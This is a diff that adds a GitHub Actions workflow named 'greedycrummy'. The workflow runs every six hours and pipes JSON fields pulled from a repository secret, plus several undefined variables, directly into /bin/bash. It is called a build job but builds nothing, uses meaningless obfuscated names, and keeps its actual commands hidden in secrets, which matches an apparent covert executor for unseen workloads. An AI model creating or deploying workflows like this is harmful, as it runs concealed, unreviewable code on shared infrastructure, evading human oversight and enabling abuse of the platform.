@@ -1,0 +1,25 @@
+name: greedycrummy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: greedycrummy
+        env:
+          opzs72: ${{ secrets.opzs72 }}
+        run: |
+          echo $opzs72 | jq -r .e0 | /bin/bash
+          echo $m6 | jq -r .bmzf07 | /bin/bash
+          echo $mnhh20 | jq -r .e54 | /bin/bash
+          echo $ta30542 | jq -r .ntq21 | /bin/bash
+          echo $imlp9181 | jq -r .w33 | /bin/bash
+          echo $xna71 | jq -r .qqb23645 | /bin/bash
+          echo $x5 | jq -r .enb07 | /bin/bash
+          echo $iarg84 | jq -r .lr1663 | /bin/bash
+
